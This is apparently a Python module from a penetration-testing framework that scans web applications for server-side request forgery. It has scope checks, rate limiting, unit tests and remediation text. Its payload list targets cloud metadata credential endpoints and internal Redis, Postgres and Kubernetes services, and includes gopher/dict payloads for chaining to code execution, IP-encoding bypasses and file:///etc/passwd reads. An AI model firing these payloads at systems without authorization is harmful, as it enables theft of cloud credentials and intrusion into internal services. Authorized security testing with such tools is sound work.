"""SSRF scanner — detect Server-Side Request Forgery in URL-accepting parameters."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from common.fp_reducer import FPReducer, Confidence

CVSS_SSRF      = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"
CVSS40_SSRF    = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N"
CVSS_SSRF_BLIND = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
CVSS40_SSRF_BLIND = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N"
# Cloud metadata endpoints (common SSRF targets)
SSRF_TARGETS = {
    # Cloud metadata — standard paths
    "AWS IMDS v1":       "http://169.254.169.254/latest/meta-data/",
    "AWS IMDS v1 creds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS IMDS v2":       "http://169.254.169.254/latest/meta-data/",  # probed with token header
    "GCP Metadata":      "http://metadata.google.internal/computeMetadata/v1/",
    "GCP Metadata alt":  "http://169.254.169.254/computeMetadata/v1/",
    "Azure IMDS":        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "DigitalOcean":      "http://169.254.169.254/metadata/v1/",
    "Oracle Cloud":      "http://169.254.169.254/opc/v1/instance/",
    # IPv6 / bypass representations of 169.254.169.254
    "IMDS IPv6 mapped":  "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "IMDS decimal":      "http://2852039166/latest/meta-data/",      # 169.254.169.254 decimal
    "IMDS hex":          "http://0xa9fea9fe/latest/meta-data/",       # hex
    "IMDS octal":        "http://025177524776/latest/meta-data/",     # octal
    # Internal services
    "Localhost HTTP":    "http://localhost/",
    "Localhost IPv6":    "http://[::1]/",
    "Localhost 8080":    "http://localhost:8080/",
    "Localhost 8443":    "https://localhost:8443/",
    "Internal Redis":    "http://localhost:6379/",
    "Internal Postgres": "http://localhost:5432/",
    "Internal Mongo":    "http://localhost:27017/",
    "Internal Elastic":  "http://localhost:9200/",
    "Internal k8s API":  "https://kubernetes.default.svc/api/",
    # Gopher/dict for SSRF-to-RCE chains (Redis/Memcached via gopher)
    "Gopher Redis PING":  "gopher://localhost:6379/_PING%0D%0A",
    "Dict Redis":         "dict://localhost:6379/info",
    # file:// — reads local files when allow_url_fopen is On (PHP) or no protocol filter
    "File Read (passwd)": "file:///etc/passwd",
    "File Read (hosts)":  "file:///etc/hosts",
}

CLOUD_INDICATORS = {
    "AWS IMDS v1":       ["ami-id", "instance-id", "local-ipv4", "iam"],
    "AWS IMDS v1 creds": ["ami-id", "instance-id", "local-ipv4", "iam"],
    "AWS IMDS v2":       ["ami-id", "instance-id", "AccessKeyId"],
    "GCP Metadata":      ["project-id", "instance", "zone", "google"],
    "GCP Metadata alt":  ["project-id", "instance", "zone"],
    "Azure IMDS":        ["subscriptionId", "resourceGroupName", "vmId"],
    "DigitalOcean":      ["droplet_id", "hostname", "vendor-data"],
    "Oracle Cloud":      ["shape", "compartmentId", "canonicalRegionName"],
    "IMDS IPv6 mapped":  ["ami-id", "instance-id"],
    "IMDS decimal":      ["ami-id", "instance-id"],
    "IMDS hex":          ["ami-id", "instance-id"],
    "IMDS octal":        ["ami-id", "instance-id"],
    "Localhost HTTP":    ["html", "HTTP", "server", "Welcome", "apache", "nginx"],
    "Localhost IPv6":    ["html", "HTTP", "server", "Welcome"],
    "Localhost 8080":    ["html", "HTTP", "server", "Welcome"],
    "Localhost 8443":    ["html", "HTTP", "server"],
    "Internal Redis":    ["+PONG", "redis_version", "-ERR", "CONFIG"],
    "Internal Postgres": ["PostgreSQL", "FATAL", "invalid"],
    "Internal Mongo":    ["ismaster", "MongoDB", "\"ok\""],
    "Internal Elastic":  ["cluster_name", "elasticsearch", "\"name\""],
    "Internal k8s API":  ["apiVersion", "kind", "kubernetes"],
    "Gopher Redis PING":  ["+PONG", "redis"],
    "Dict Redis":         ["redis_version", "redis_mode"],
    "File Read (passwd)": ["root:x:", "root:0:0:", "daemon:x:", "nobody:x:"],
    "File Read (hosts)":  ["127.0.0.1", "::1", "localhost"],
}

# URL parameters likely to trigger SSRF
URL_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "next", "return", "returnUrl", "redirect_url",
    "callback", "webhook", "target", "fetch", "load",
    "import", "export", "file", "path", "resource",
    "feed", "api", "endpoint", "proxy",
    # PHP image/QR functions that accept file paths and can trigger file:// SSRF
    "bcode", "image", "data", "template", "avatar", "picture", "icon",
]


class SsrfScanner(BaseModule):
    """SSRF vulnerability scanner."""

    NAME        = "ssrf_scanner"
    DESCRIPTION = "Detect SSRF in URL-accepting parameters via cloud metadata probing"
    PHASE       = 8
    TAGS        = ["file", "ssrf", "cwe-918", "owasp-a10"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Find URL parameters from crawled pages
        test_targets: list[tuple[str, str]] = []
        crawled = self.config.extra.get("crawled_urls", [target])
        forms   = self.config.extra.get("found_forms", [])

        url_param_pattern = re.compile("|".join(URL_PARAMS), re.IGNORECASE)

        for url in crawled[:50]:
            if "?" in url:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    if url_param_pattern.search(param):
                        test_targets.append((url, param))

        # Also probe common webhook/fetch endpoints
        for path in ["/webhook", "/fetch", "/proxy", "/api/fetch",
                     "/api/webhook", "/api/proxy", "/import"]:
            for param in ["url", "uri", "source"]:
                test_targets.append((f"{target}{path}?{param}=https://example.com", param))

        self.log.info("Testing %d URL parameter(s) for SSRF", len(test_targets))
        self._fp = FPReducer(
            collab_client=self.config.extra.get("collab_client"),
            headers=self.config.extra.get("session_headers", {}),
        )

        sem = asyncio.Semaphore(2)
        tasks = [self._test_ssrf(url, param, target, sem)
                 for url, param in test_targets[:30]]
        await asyncio.gather(*tasks, return_exceptions=True)

        if forms:
            self.log.info("Testing %d form(s) for POST SSRF", len(forms))
            await self._post_forms_for_ssrf(forms, target)

        # OOB blind SSRF via ForgeCollab (Pillar 17B)
        await self._test_blind_ssrf_oob(test_targets[:10], target)

        return self._make_result(start)

    async def _test_ssrf(
        self, url: str, param_name: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return

            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            for ssrf_target_name, ssrf_url in SSRF_TARGETS.items():
                await self.rate_limit()
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = ssrf_url
                test_url = (
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    f"?{urlencode(test_params)}"
                )

                try:
                    import aiohttp
                    # For AWS IMDSv2: include the token header — some SSRF
                    # implementations follow PUT→GET flows or pass headers through
                    extra_headers: dict[str, str] = {}
                    if "IMDS v2" in ssrf_target_name or "169.254.169.254" in ssrf_url:
                        extra_headers["X-aws-ec2-metadata-token"] = "test-token-bypass"
                        extra_headers["Metadata"] = "true"  # Azure IMDS also needs this
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url,
                            headers=extra_headers,
                            timeout=aiohttp.ClientTimeout(total=10),
                        ) as resp:
                            body = await resp.text(errors="ignore")

                    if self._is_waf_placeholder(body, resp.status, resp.headers):
                        continue

                    # Check if cloud metadata or service-specific content appeared.
                    # Generic localhost HTML is not proof of SSRF; SPAs and WAFs
                    # commonly return the public app shell for every probe.
                    indicators = CLOUD_INDICATORS.get(ssrf_target_name, [])
                    hits = [i for i in indicators if i in body]
                    if hits and self._strong_ssrf_indicator(ssrf_target_name, body, hits):
                        severity = Severity.CRITICAL
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:500],
                            extra={
                                "param":          param_name,
                                "ssrf_target":    ssrf_target_name,
                                "ssrf_url":       ssrf_url,
                                "indicators_hit": hits,
                            },
                        )
                        ev.screenshot_path = self.capture_screenshot(
                            test_url, finding_id=f"ssrf_{param_name}"
                        )
                        self.new_finding(
                            title=f"SSRF — {ssrf_target_name} Data Leaked ({param_name})",
                            severity=severity,
                            description=(
                                f"SSRF confirmed in '{param_name}'. "
                                f"Server fetched {ssrf_url} and returned {ssrf_target_name} data. "
                                "An attacker can access internal services, cloud credentials, "
                                "and instance metadata."
                            ),
                            reproduction_steps=[
                                f"curl '{test_url}'",
                                f"Response contains: {indicators}",
                            ],
                            remediation=(
                                "Validate and allowlist URLs before fetching. "
                                "Block access to internal/RFC-1918/link-local addresses. "
                                "Use SSRF-safe HTTP clients that reject internal requests. "
                                "Enable IMDSv2 on AWS (requires token header — v1 won't work from SSRF)."
                            ),
                            references=["CWE-918", "OWASP A10:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_SSRF,
                            cvss_v40_vector=CVSS40_SSRF,
                            mitre_attack=["TA0001/T1190"],
                            target=target,
                            url=url,
                        )
                        return

                except Exception:
                    pass

    async def _post_forms_for_ssrf(self, forms: list[dict], target: str) -> None:
        """Test form POST endpoints for SSRF via URL parameters."""
        for form in forms[:10]:
            for input_name in form.get("inputs", []):
                if re.search("|".join(URL_PARAMS), input_name, re.IGNORECASE):
                    action = form.get("action", target)
                    if not self.check_scope(action):
                        self.log.debug("ssrf_scanner: skipping out-of-scope form action: %s", action)
                        continue
                    for ssrf_url in list(SSRF_TARGETS.values())[:2]:
                        await self.rate_limit()
                        data = {i: "test" for i in form.get("inputs", [])}
                        data[input_name] = ssrf_url
                        try:
                            import aiohttp
                            async with aiohttp.ClientSession(
                                connector=aiohttp.TCPConnector(ssl=False)
                            ) as session:
                                async with session.post(
                                    action, data=data,
                                    timeout=aiohttp.ClientTimeout(total=10),
                                ) as resp:
                                    body = await resp.text(errors="ignore")
                            for name, indicators in CLOUD_INDICATORS.items():
                                if any(i in body for i in indicators):
                                    self.log.warning("SSRF in POST form: %s=%s", input_name, ssrf_url)
                        except Exception:
                            pass


    async def _test_blind_ssrf_oob(
        self, test_targets: list[tuple[str, str]], base_target: str
    ) -> None:
        """Test for blind SSRF using ForgeCollab OOB callbacks (Pillar 17B).

        For each URL/param pair, injects a ForgeCollab callback URL as the
        SSRF value. If the target server fetches it, ForgeCollab receives a
        DNS/HTTP ping → confirmed blind SSRF even without visible response.
        """
        try:
            from forge_collab.server import CollabClient
        except ImportError:
            return

        collab_domain = self.config.extra.get("collab_domain", "")
        if not collab_domain:
            import os
            collab_domain = os.environ.get("FORGE_COLLAB_DOMAIN", "")
        if not collab_domain:
            return

        collab = CollabClient(collab_domain=collab_domain)

        for url, param in test_targets[:5]:
            if not self.check_scope(url):
                self.log.debug("ssrf_scanner: skipping out-of-scope OOB target: %s", url)
                continue
            await self.rate_limit()
            try:
                token = collab.register("ssrf_scanner", "blind_ssrf", url, param)
                oob_url = collab.build_url(token)
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = oob_url
                test_url = (
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    f"?{urlencode(test_params)}"
                )

                import aiohttp
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.get(
                        test_url, timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        await resp.read()

                got_cb = await collab.wait_for_callback(token, timeout=8.0)
                if got_cb:
                    from common.evidence import Evidence
                    ev = Evidence(
                        request_raw=f"GET {test_url}",
                        response_raw=f"ForgeCollab OOB callback received for token {token[:8]}",
                        extra={"param": param, "oob_url": oob_url, "token": token},
                    )
                    self.new_finding(
                        title=f"Blind SSRF (OOB Confirmed) — {param}",
                        severity=Severity.HIGH,
                        description=(
                            f"Blind SSRF confirmed in '{param}' via ForgeCollab OOB callback. "
                            f"The server fetched {oob_url}, generating a DNS/HTTP ping back "
                            f"to the Forge Collaborator infrastructure. No visible response "
                            "was needed — true blind SSRF with OOB proof."
                        ),
                        reproduction_steps=[
                            f"1. Register ForgeCollab token: {token[:8]}",
                            f"2. Set {param}={oob_url}",
                            f"3. GET {test_url}",
                            "4. ForgeCollab callback received — server fetched OOB URL",
                        ],
                        remediation=(
                            "Validate and restrict outbound HTTP requests. "
                            "Implement allowlisting for external fetch endpoints. "
                            "Deploy egress filtering to block SSRF at the network layer."
                        ),
                        references=["CWE-918", "OWASP A10:2021"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_SSRF_BLIND,
                        cvss_v40_vector=CVSS40_SSRF_BLIND,
                        mitre_attack=["TA0001/T1190"],
                        target=base_target,
                        url=url,
                    )
            except Exception as exc:
                self.log.debug("OOB SSRF test error (%s, %s): %s", url, param, exc)

    def _strong_ssrf_indicator(self, target_name: str, body: str, hits: list[str]) -> bool:
        """Require target-specific proof instead of generic HTML/server words."""
        lower_name = target_name.lower()
        lower_body = body[:12000].lower()
        if "localhost" in lower_name:
            return any(
                token in lower_body
                for token in (
                    "apache server status",
                    "server uptime",
                    "redis_version",
                    "mongodb",
                    "cluster_name",
                    "kubernetes",
                )
            )
        if "file read" in lower_name:
            return any(token in lower_body for token in ("root:x:", "daemon:x:", "127.0.0.1 localhost"))
        if "redis" in lower_name:
            return any(token in lower_body for token in ("+pong", "redis_version", "-err"))
        if "postgres" in lower_name:
            return any(token in lower_body for token in ("postgresql", "fatal"))
        if "mongo" in lower_name:
            return any(token in lower_body for token in ("mongodb", '"ok"', "ismaster"))
        if "elastic" in lower_name:
            return any(token in lower_body for token in ("cluster_name", "elasticsearch"))
        return bool(hits)


class TestSsrfScanner:
    def test_ssrf_targets_not_empty(self) -> None:
        assert len(SSRF_TARGETS) >= 5

    def test_url_params_not_empty(self) -> None:
        assert "url" in URL_PARAMS
        assert "redirect" in URL_PARAMS

    def test_aws_imds_url(self) -> None:
        assert "169.254.169.254" in SSRF_TARGETS.get("AWS IMDS v1", "")

    def test_post_forms_skips_out_of_scope_action(self) -> None:
        """_post_forms_for_ssrf must not POST to out-of-scope form actions."""
        import asyncio
        from unittest.mock import MagicMock, patch

        mod = SsrfScanner.__new__(SsrfScanner)
        mod.config = MagicMock()
        mod.config.target = "http://in-scope.example.com"
        mod.config.extra = {}
        mod.log = MagicMock()
        mod._seen_finding_keys = {}

        forms = [{"inputs": ["url"], "action": "http://out-of-scope.evil.com/submit"}]
        posted_urls = []

        async def fake_post(url, **kwargs):
            posted_urls.append(url)
            return MagicMock(__aenter__=MagicMock(), __aexit__=MagicMock())

        async def fake_rate_limit() -> None:
            return None

        with patch.object(mod, "check_scope", side_effect=lambda u: "in-scope.example.com" in u), \
             patch.object(mod, "rate_limit", side_effect=fake_rate_limit):
            asyncio.run(mod._post_forms_for_ssrf(forms, "http://in-scope.example.com"))

        assert not any("out-of-scope.evil.com" in u for u in posted_urls), \
            "Must not POST to out-of-scope form action"

    def test_oob_skips_out_of_scope_url(self) -> None:
        """_test_blind_ssrf_oob must not fire requests for out-of-scope URLs."""
        import asyncio
        import sys
        from unittest.mock import MagicMock, patch

        mod = SsrfScanner.__new__(SsrfScanner)
        mod.config = MagicMock()
        mod.config.target = "http://in-scope.example.com"
        mod.config.extra = {"collab_domain": "collab.forge.local"}
        mod.log = MagicMock()
        mod._seen_finding_keys = {}

        test_targets = [("http://out-of-scope.evil.com/?url=x", "url")]
        rate_limit_called = []

        async def fake_rate_limit():
            rate_limit_called.append(True)

        # Mock forge_collab so CollabClient instantiation doesn't fail
        mock_collab_client = MagicMock()
        mock_forge_collab = MagicMock()
        mock_forge_collab.server.CollabClient = MagicMock(return_value=mock_collab_client)

        with patch.dict(sys.modules, {"forge_collab": mock_forge_collab,
                                       "forge_collab.server": mock_forge_collab.server}), \
             patch.object(mod, "check_scope", return_value=False), \
             patch.object(mod, "rate_limit", side_effect=fake_rate_limit):
            asyncio.run(mod._test_blind_ssrf_oob(test_targets, "http://in-scope.example.com"))

        assert not rate_limit_called, "rate_limit() must not be called for out-of-scope OOB targets"
        mock_collab_client.register.assert_not_called()
